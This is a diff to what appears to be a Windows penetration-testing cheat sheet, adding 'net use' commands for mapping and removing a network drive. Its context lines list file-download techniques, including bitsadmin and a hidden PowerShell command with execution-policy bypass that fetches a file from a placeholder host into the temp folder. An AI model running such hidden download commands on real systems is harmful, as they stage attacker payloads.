@@ -123,6 +123,10 @@ C:\windows\explorer.exe http://somewhere.com/filename.ext
 ftp ftp.site.dom
 bitsadmin /transfer systemrepair /download /priority normal http://path/to/file c:\path\local\file
 powershell.exe -w hidden -nop -ep bypass -c "(new-object net.webclient).DownloadFile('http://ip:port/file', 'C:\Windows\temp\testfile')"
+net use Z: \\netbios_name\share /PERSISTENT:YES
+	-connect to network drive
+net use Z: /delete
+	-disconnect network drive
 
 	
 USERS/GROUPS
